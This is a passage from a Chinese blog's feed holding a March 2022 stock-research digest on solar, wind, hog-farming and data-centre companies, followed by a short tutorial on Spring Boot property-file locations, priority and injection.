    <id>https://www.memestarter.top/2022/03/23/%E8%82%A1%E7%A5%A8-20220323/</id>
    <published>2022-03-23T00:15:28.000Z</published>
    <updated>2022-03-23T00:48:22.060Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题材"><a href="#题材" class="headerlink" title="题材"></a>题材</h2><h3 id="BIPV成为光伏"><a href="#BIPV成为光伏" class="headerlink" title="BIPV成为光伏"></a>BIPV成为光伏</h3><p>中信证券：BIPV成为光伏节能建筑新形态，龙头企业抢占先发优势 </p><p>【本文来自持牌证券机构，不代表平台观点，请独立判断和决策。】</p><p>中信证券指出，BIPV全生命周期经济性凸显，在平价时代成为更具竞争力的光伏建筑解决方案。“双碳”目标驱动之下，建筑行业转型需求迫切，政策支持力度有望提升，“十四五”期间或迎爆发式增长，潜在市场规模可达千亿级别。</p><p>1）BIPV解锁光伏建筑应用新场景</p><p>光伏建筑一体化（Building Integrated Photovoltaic, BIPV）是分布式光伏发电系统的一种应用形式，实现了光伏发电产品和建筑的有机结合，兼具发电功能和建材属性，针对传统屋顶加装的光伏系统存在的一系列问题提供了解决方案。</p><p>从国内市场来看，工业厂房、商业建筑、公共建筑屋顶和外立墙面可安装面积大，在晶硅组件成本不断下降、效率持续提升的情况下，已初具经济性，成为BIPV最具潜力和可行性的应用场景。</p><p>在全球范围内，BIPV尚处于起步阶段，2020年安装规模约1GW，占全球新增光伏装机规模约1%。BIPV的发展前期主要依赖政策支持，而随着经济性的不断提升，对政策的依赖度也在减弱，预计将在光伏平价时代迎来发展契机。</p><p>作为建筑行业实现“双碳”目标的重要路径，光伏建筑持续获政策支持，“十四五”期间有望加速铺开。</p><p>建筑行业减碳压力倒逼下，BIPV将迎爆发式增长。中信基于建筑面积的测算，预计“十四五”末国内BIPV市场规模或可达千亿级别，发展前景广阔。</p><p>2）发展路径探索期，龙头抢占先发优势</p><p>BIPV产业链下游的产品与服务集成环节处于发展初期，格局未定，吸引来自光伏和建筑两个行业的玩家纷纷入局。</p><p>虽然多方努力下标准体系日臻完善，但推广落地仍存在诸多难点：1）行业融合难，建筑与光伏互相割裂；2）运营期维保缺位，无法满足维修与升级需求；3）项目全周期涉及多方利益主体，责任与收益划分不明确，成熟的商业模式有待探索。随着政策的出台，各方的积极探索，上述问题有望逐步得到解决。</p><p>预计2022年将是BIPV行业政策和项目加快落地的一年，在双碳“1+N”政策体系中，BIPV是实现建筑节能的有效方案之一；在市场发展中，各方主体都在积极推动规模化项目的落地。</p><p>从已有项目经验来看，BIPV各环节玩家均有望开拓市场突破口，其中推进速度较快的是组件企业和建筑建材企业。</p><p>同时，基于BIPV“光伏+建筑”的双重属性，光伏企业与建筑企业联合发展的模式应运而生，通过强强联合，先发领跑优势明显。BIPV相较于常规光伏系统有更多样化的组件产品，更好的封装材料，更薄的玻璃，低压电流的解决方案等；光伏产品和建筑结合的部分需要更坚固的结构件，更好的防水材料等。BIPV行业的发展将给产业链带来明显的变化。</p><p>推荐积极合作前瞻布局的企业：隆基股份，福斯特，森特股份，东方雨虹，亚玛顿</p><h3 id="风电"><a href="#风电" class="headerlink" title="风电"></a>风电</h3><p>民生证券：十四五”能源规划发布，加快推动能源绿色低碳转型，风光装机有望迎来加速</p><p>【本文来自持牌证券机构，不代表平台观点，请独立判断和决策。】</p><p>《“十四五”现代能源体系规划》日前正式印发。民生证券点评称，《规划》提出“全面推进风电和太阳能发电大规模开发和高质量发展，风光装机有望迎来加速。此外，加强电力输送通道建设、氢能关键技术攻关等都有所涉及。</p><p>事件：</p><p>3月22日，国家发改委、国家能源局正式印发《“十四五”现代能源体系规划》。</p><p>点评：</p><p>1）安全稳定优先</p><p>增强能源供应链稳定性和安全性。在推动能源革命的同时也要确保能源供应安全，我国“富煤贫油少气”的资源禀赋，决定了能源低碳转型过程难以一蹴而就，需要通盘谋划。</p><p>《规划》提出“发挥煤电支撑性调节性作用，统筹电力保供和减污降碳，根据发展需要合理建设先进煤电”。现阶段高参数、大容量煤电仍是煤炭清洁高效利用的不二之选，也是能源供应的压舱石和稳定器。</p><p>《规划》同时提出“全面加强核电安全管理，实行最严格的安全标准和最严格的监管”、“在确保安全的前提下，积极有序推动沿海核电项目建设，保持平稳建设节奏”，在前期三门2号、台山1号问题的处理上，绝对安全始终放在首位，包括国产第三代核电“华龙一号” 首批4台示范机组的投产进度也有所放缓。虽然《规划》提出“到2025 年核电运行装机容量达到7000万千瓦左右”，但截至目前国内51台在运机组合计装机容量5331万千瓦，在建机组中规划在2025年及以前投产的有12台、合计装机1294万千瓦；如果将规划在2026年投产的6台机组进度提前，并不符合“绝对安全”的宗旨，因此我们维持2025年66GW在运核电的装机目标不变。</p><p>2）兼顾绿色低碳</p><p>加快推动能源绿色低碳转型。《规划》提出“全面推进风电和太阳能发电大规模开发和高质量发展，优先就地就近开发利用”、“积极推进水电基地建设，推动金沙江上游、雅砻江中游、黄河上游等河段水电项目开工建设，实施雅鲁藏布江下游水电开发等重大工程”、“推动西南地区水电与风电、太阳能发电协同互补”。大型水电工程的巨大库容和机组快速启停能力，使其具备良好的调节性能，适合与风、光联合开发、运营，打造清洁能源外送基地。</p><p>3）《规划》同时提出“稳步发展城镇生活垃圾焚烧发电，有序发展农林生物质发电和沼气发电”，结合新型城镇化和城乡融合发展工作的要求，垃圾发电行业将稳中有进。</p><p>《规划》的成文日期在1月29日，主要内容基本延续了前期各项相关政策。</p><p>3）氢能关注度也持续提升</p><p>此外，国盛证券也点评指出，氢能关注度也持续提升，顶层设计即将出台，氢能产业有望开启发展新阶段。发改委将于3月23日（星期三）上午10:00召开发布会，介绍氢能产业发展中长期规划（2021—2035年）有关情况。</p><p>本次规划或将提出加快推动氢能关键技术的攻关，适度超前部署一批氢能项目，着力攻克可再生能源制氢和氢能储运、应用及燃料电池等核心技术，氢能作为能源转型过程中实现工业、交通等领域脱碳的重要方式，当前关注度得到快速提升。</p><p>2021年我国燃料电池汽车示范工作正式启动，入围城市群均已推出相关补贴&#x2F;扶持政策，从应用端推动氢能产业发展；此外在供给端，内蒙古等新能源装机大省“十四五”期间将着力推动绿氢发展，部分化工企业也在大力布局工业副产氢、煤制氢等灰氢&#x2F;蓝氢的生产。随着《氢能产业发展中长期规划（2021-2035年）》即将于3月23日发布，顶层规划正式落地，氢能产业有望开启商业化发展新阶段 。</p><p>推荐绿色低碳方向，水电推荐：长江电力，火电推荐  申能股份 核电推荐 中国核电   风电运营 推荐 三峡能源</p><h3 id="猪肉"><a href="#猪肉" class="headerlink" title="猪肉"></a>猪肉</h3><p>国海证券：供给过剩、需求不足和成本持续高企加速产能去化，生猪行业目前既具安全边际、又有向上弹性<br>【本文来自持牌证券机构，不代表平台观点，请独立判断和决策。】</p><p>国海证券认为，生猪养殖行业近期持续亏损，产能加速出清，猪价年中有望触底反转。当前生猪板块仍处在重要布局窗口期，既具安全边际，又有向上弹性。</p><p>1）生猪数据跟踪</p><p>本周生猪均价11.78元&#x2F;公斤，环比-0.24元；15公斤仔猪价格403元&#x2F;头，环比+3元；50公斤二元母猪价格为1632元&#x2F;头，环比持平；本周前三等级白条均价15.48元&#x2F;公斤，环比-0.24元；商品猪出栏均重117.58公斤，环比-0.18公斤。</p><p>2）既具安全边际，又有向上弹性</p><p>本周猪价继续下行，基本面维持疲弱的趋势，据农业农村部信息，截至2月末全国能繁母猪存栏量4268万头，环比下降0.5%，为连续八个月下滑，单从数据上看比1月份去化幅度有所下降，但考虑到春节等因素，这次能繁母猪下滑仍处在合理范围。且与历次周期不同，在这轮下行周期里，能繁母猪始终保持着月度下降，可见能繁处于高强度去化当中。生猪行业当前情况下，供给过剩、需求不足和成本持续高企等多重因素堆积，将带来产能去化加速。</p><p>3）当前生猪板块仍处在重要布局窗口期</p><p>①产能持续去化，从去年7月份以来连续八个月环比下降，产能下行保持着高强度，去化方向保持着高稳定性，且在供需和成本等多重因素之下有望加速；</p><p>②猪价处在底部区域，且往下空间非常小，处在极其有利于产能去化的环境下；</p><p>③估值仍处于底部区域，尤其头部企业对应2022年估值处在底部，具备了足够的防御性，也为猪价上行期带来了较大的弹性。</p><p>因此，当前仍处在非常好的配置时点。  关注：养殖成本领先的 牧原股份 。成本下降的 温氏股份，新希望；周期反转带动优异业绩弹性的 傲农生物；间距养殖成本和资金优势的 巨星农牧  </p><h2 id="个股"><a href="#个股" class="headerlink" title="个股"></a>个股</h2><h3 id="数据港"><a href="#数据港" class="headerlink" title="数据港"></a>数据港</h3><p>“数字经济+东数西算+5G”已在酝酿新一轮需求浪潮，这家公司新增8个数据中心扩张20000个机柜，同时卡位“北上广+内蒙古”核心资源。<br>数据港（603881）：<br>①长江证券于海宁看好公司2021年新增8个数据中心，其中公司IT负载合计达到约352.72兆瓦（MW），折算成5千瓦（KW）标准机柜约70,544个，大幅扩张约2万个机柜，预计未来伴随项目上架率提升，将逐步实现收入和利润；<br>②伴随着“东数西算”政策落地以及数字经济持续推进，叠加“能耗双控”或将推动数据中心迎来供给侧改革，公司作为批发型IDC头部厂商有望受益，公司数据中心占据杭州、上海等核心区域，并陆续新增河北张北、北京房山、江苏南通、广东河源、内蒙古乌兰察布等数据中心；<br>③5G大规模商用给数据中心带来的下一轮需求增长已在酝酿，根据GSMA智库数据，2025年中国将以6亿用户数成为全球最大的5G市场，占全球比重40%；<br>④于海宁预计公司2022-2024年净利润为1.65&#x2F;2.58&#x2F;3.51亿元，同比增长48.6%&#x2F;56.4%&#x2F;36.0%，对应PE为82&#x2F;53&#x2F;39倍；<br>⑤风险提示：公司多元化拓展不及预期、行业竞争持续加剧等。</p><p>“数字经济+东数西算+5G”已在酝酿新一轮需求浪潮，这家公司新增8个数据中心扩张20000个机柜，同时卡位“北上广+内蒙古”核心资源事件：数据港发布2021年年报，报告期内公司实现营收12.06亿元，同比增长32.55%；实现归母净利润1.11亿元，同比下滑18.59%；实现扣非净利润0.99亿元，同比下滑22.16%；实现EBITDA8.16亿元，同比增长50.83%。长江证券于海宁认为，2021年大量项目交付带来的折旧成本的增加对公司盈利能力有所承压，预计未来伴随项目上架率提升，将逐步实现收入和利润。公司机柜规模仍高速扩张，项目储备丰富，后续扩张确定性强。截至2021年底，公司累计已建成及已运营数据中心33个，较2020年底新增8个数据中心；其中公司IT负载合计达到约352.72兆瓦（MW），折算成5千瓦（KW）标准机柜约70,544个，较2020年底的50,060个机柜大幅扩张约2万个机柜。伴随着“东数西算”政策落地以及数字经济持续推进，叠加“能耗双控”或将推动数据中心迎来供给侧改革，公司作为批发型IDC头部厂商，有望持续受益。于海宁预计公司2022-2024年净利润为1.65&#x2F;2.58&#x2F;3.51亿元，同比增长48.6%&#x2F;56.4%&#x2F;36.0%，对应PE为82&#x2F;53&#x2F;39倍。四季度营收环比增幅较快，机柜规模高速扩张2021年四季度，公司实现营收3.51亿元，同比增长36.12%，环比增长15.10%，主要系四季度机柜上架率的稳步抬升带来收入的提升。公司在2021年大量的项目交付之后，折旧等运维成本大幅增加，其中电费、房屋设备租赁及折旧成本大幅上升，成本占比达到90%，分别同比增长36%和71%，折旧费用暂时拖累业绩。<br>目前，公司在建工程达到3.34亿元，较去年年末减少15.70亿元，公司在2021年在建工程转固项目较多。展望2022年，于海宁认为新投入运营的数据中心项目将随终端客户的上架进度逐步实现收入和利润。“东数西算”政策落地大背景下，存量热门区域的IDC资源稀缺性或将进一步提升由于数据中心属于高能耗行业，对土地资源、电力资源等有较高需求，同时鉴于大型IDC客户集中于北上广深等一线城市，长期来看在一线城市IDC资源仍然会呈现供应紧缺的情况。此时具备完善的包括能评在内的审批手续的专业第三方IDC运营商将具备显著优势。公司的数据中心占据杭州、上海等核心区域，并在原有数据中心的基础上，又陆续新增河北张北、北京房山、江苏南通、广东河源、内蒙古乌兰察布等数据中心。展望2022年及未来，公司将紧跟国家“东数西算”的数据中心布局规划指引，持续拓展与积累核心城市数据中心资源，快速拓展业务规模及挖掘潜在客户，有望在政策推动下持续受益。此外，5G大规模商用给数据中心带来的下一轮需求增长已在酝酿。根据GSMA智库数据，到2025年，全球411家运营商将会在119个国家&#x2F;地区商用5G网络，全球5G用户数将超过16亿，中国将以6亿用户数成为全球最大的5G市场，占比40%。</p><h3 id="天马科技"><a href="#天马科技" class="headerlink" title="天马科技"></a>天马科技</h3><p>这家特种水产饲料巨头获机构关注，公司打造鳗鲡全产业链，高品质鳗鲡饲料产销量稳居全球首位，国内市场占有率25%；</p><p>天马科技于3月21日接待机构调研时表示，公司2021年实现营业总收入54.86亿元，同比增长50.73%；实现营业利润15,746.82万元，同比增长23.97%；实现利润总额15,480.73万元，同比增长22.24%；实现归属于上市公司股东的净利润8,321.49万元，同比增长20.70%。报告期内，公司取得了营收和利润双增长的成绩，实现了企业持续、稳定和较快发展。</p><p>报告期内，公司全产业链布局初步到位，特种水产饲料和畜禽饲料产销量均创历史新高；公司鳗鲡绿色生态智慧养殖项目顺利推进，鳗鲡养殖效果良好，在2021年第四季度已开始第一批出鱼，为公司带来新的利润增长点；在食品端，公司启动线上化与地域化战略，在稳固出口渠道的同时积极拓展国内线上及线下渠道，营业收入稳步增长。</p><p>公司上市时以特种水产饲料为主营业务，特种水产配合饲料产品主要应用于鳗鲡、石斑鱼、大黄鱼、鲆鲽鳎、海参、鲍等特种水产动物从种苗期至养成期的养殖全过程，其中公司的鳗鲡配合饲料产销量多年来稳居全球首位。</p><p>公司目前已成功打造了鳗鲡全产业链，高品质鳗鲡饲料产销量多年来稳居全球首位，目前国内市场占有率在25%左右。</p><p>A股相关上市公司中，<em><strong>粤海饲料</strong></em> 主要从事水产饲料研发、生产及销售，并以虾料、海水鱼料等特种水产饲料为主，覆盖水产动物的不同生长阶段。</p><h3 id="金通灵"><a href="#金通灵" class="headerlink" title="金通灵"></a>金通灵</h3><p>机构密集调研这家流体机械小龙头，公司氢燃料电池空气压缩机下半年投产，目标拿下氢能源车相关产品10%的市场份额；金通灵于3月7-8日接待三批机构调研，截止2025年，氢燃料电池汽车保有量为10万辆，中国氢燃料电池空气压缩机市场规模预测为60亿元。公司目标是该类产品在“十四五”末占氢能源车相关产品市场份额的10%左右。</p><p>调研过程中，公司透露，氢燃料电池空气压缩机的生产线建设将于今年上半年竣工，下半年正式试生产。后续将根据市场需求和客户反馈，持续优化技术参数和质量水平。通过未来两到三年的努力，争取实现销售量达到设计的产能。</p><p>除氢燃料电池空气压缩机外，公司在氢能领域还布局了生物质制氢，同时，公司在氢能领域与北京汉氢科氢能技有限公司进行了合作。</p><p>A股相关上市公司中，致远新能参股企业江苏申氢宸主要产品为燃料电池阳极端核心部件，业务正逐步进入量产阶段，主要客户为中弗新能源、东方电气和捷氢能源等。厚普股份在氢能基础设施中的业务为氢能加注设备及核心零部件的研发、生产和集成，多项核心零部件拥有自主知识产权。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;题材&quot;&gt;&lt;a href=&quot;#题材&quot; class=&quot;headerlink&quot; title=&quot;题材&quot;&gt;&lt;/a&gt;题材&lt;/h2&gt;&lt;h3 id=&quot;BIPV成为光伏&quot;&gt;&lt;a href=&quot;#BIPV成为光伏&quot; class=&quot;headerlink&quot; title=&quot;BIPV成为光伏&quot;</summary>
      
    
    
    
    <category term="投资 - 股票" scheme="https://www.memestarter.top/categories/%E6%8A%95%E8%B5%84-%E8%82%A1%E7%A5%A8/"/>
    
    
    <category term="股票" scheme="https://www.memestarter.top/tags/%E8%82%A1%E7%A5%A8/"/>
    
    <category term="投资" scheme="https://www.memestarter.top/tags/%E6%8A%95%E8%B5%84/"/>
    
  </entry>
  
  <entry>
    <title>springboot中的属性文件总结</title>
    <link href="https://www.memestarter.top/2022/03/22/springboot%E4%B8%AD%E7%9A%84%E5%B1%9E%E6%80%A7%E6%96%87%E4%BB%B6%E6%80%BB%E7%BB%93/"/>
    <id>https://www.memestarter.top/2022/03/22/springboot%E4%B8%AD%E7%9A%84%E5%B1%9E%E6%80%A7%E6%96%87%E4%BB%B6%E6%80%BB%E7%BB%93/</id>
    <published>2022-03-22T14:14:35.000Z</published>
    <updated>2022-03-22T14:37:18.660Z</updated>
    
    <content type="html"><![CDATA[<h2 id="属性文件放在哪里"><a href="#属性文件放在哪里" class="headerlink" title="属性文件放在哪里"></a>属性文件放在哪里</h2><p>我们知道springboot的属性文件一般是以.properties结尾或者以ymal结尾。至于这两种配置方式的优劣，仁者见仁智者见智了。但是，他们在某些场景的特点还是要注意以下的。那就是yaml中配置的属性是有顺序的，properties中配置的文件是没有顺序的，这个时候如果您的应用程序对属性的加载顺序有要求，这个时候使用yaml配置文件为佳。</p><p>一般情况下，大概有4个地方可以放置属性文件。</p><ol><li>项目根目录下的 config 目录下</li><li>项目的根目录下的application.properties文件</li><li>项目src下面的 resources 目录下的 config 目录下</li><li>项目src下面的 resources 目录下的application.properties文件</li></ol><h2 id="属性文件的优先级"><a href="#属性文件的优先级" class="headerlink" title="属性文件的优先级"></a>属性文件的优先级</h2><p>如下图，这几个位置的优先级，1&gt;2&gt;3&gt;4 ，所以，如果您有属性需要全局覆盖，就可以在项目根目录下面的 config文件夹下面设置<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220322222034.png" alt="20220322222034"></p><h2 id="属性文件的依赖注入"><a href="#属性文件的依赖注入" class="headerlink" title="属性文件的依赖注入"></a>属性文件的依赖注入</h2><p>由于springboot 包含了spring的特性。回顾一下，spring中怎么注入属性的。假设我们有一个server.properties的配置文件需要配置到项目的中。<br>属性文件server.properties</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site.name=测试站点</span><br><span class="line">site.url=http://localhost/</span><br></pre></td></tr></table></figure><p>java接受属性文件的bean</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@Component</span><br><span class="line">@PropertySource(&quot;classpath:site.properties&quot;)</span><br><span class="line">class Site &#123;</span><br><span class="line">    @Value(&quot;$&#123;site.name&#125;&quot;)</span><br><span class="line">    String name;</span><br><span class="line">    @Value(&quot;$&#123;site.url&#125;&quot;)</span><br><span class="line">    String url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：这里</p><ol><li>Site类使用了 Component注解，这个代表这个类要交个容器托管，这样，属性才可以注入。</li><li>使用了@Value注解，使用了 server.properties 中的字段的全拼去引用 属性</li><li>使用了PropertySource引用自己定义的属性名字的属性文件。</li></ol><p>没问题，启动springboot在别的地方调用site即可获取属性</p><h2 id="属性文件的安全性"><a href="#属性文件的安全性" class="headerlink" title="属性文件的安全性"></a>属性文件的安全性</h2><p>上面的例子中，每个属性都要调用全拼属性的名字来引用，如果有非常多的属性怎么办？？？？？别着急springboot也想到了</p><p>&#96;&#96;&#96;&#96;<br>@Component<br>@PropertySource(“classpath:site.properties”)<br>@ConfigurationProperties(prefix &#x3D; “site”)<br>class Site {<br>    String name;<br>    String url;<br>}</p><p>&#96;&#96;&#96;</p><p>这里和上面的例子比起来，没有使用@Value注解来获取属性，极大降低了工作量和出错的概率。而这一期都是 @ConfigurationProperties的 功劳。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;属性文件放在哪里&quot;&gt;&lt;a href=&quot;#属性文件放在哪里&quot; class=&quot;headerlink&quot; title=&quot;属性文件放在哪里&quot;&gt;&lt;/a&gt;属性文件放在哪里&lt;/h2&gt;&lt;p&gt;我们知道springboot的属性文件一般是以.properties结尾或者以ymal结尾。</summary>
      
    
    
    
    <category term="技术生活 - 编程技术 - 后端技术" scheme="https://www.memestarter.top/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="springboot" scheme="https://www.memestarter.top/tags/springboot/"/>
    
    <category term="配置文件" scheme="https://www.memestarter.top/tags/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"/>
    
    <category term="优先级" scheme="https://www.memestarter.top/tags/%E4%BC%98%E5%85%88%E7%BA%A7/"/>
    
  </entry>
  
</feed>
